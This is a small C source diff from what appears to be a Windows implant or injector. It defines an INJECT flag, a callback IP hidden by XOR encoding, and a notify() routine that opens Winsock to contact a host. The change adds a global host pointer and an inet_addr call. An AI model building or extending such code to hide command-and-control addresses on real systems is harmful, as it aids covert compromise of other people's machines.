@@ -49,6 +49,7 @@ void net_setup();
 #define INJECT
 // Socket
 #define PRIMARY_IP "192.168.56.1"
+volatile const char* g_host = PRIMARY_IP;
 
 #define IP_XOR_KEY 0x41
 #define ENCODED_IP {0x70, 0x78, 0x73, 0x6f, 0x70, 0x77, 0x79, 0x6f, 0x74, 0x77, 0x6f, 0x70}
@@ -81,6 +82,7 @@ void net_setup()
 // notify to host tcp
 void notify()
 {
+	inet_addr(PRIMARY_IP);
 	WSADATA wsa;
 	WSAStartup(MAKEWORD(2, 2), &wsa);
 
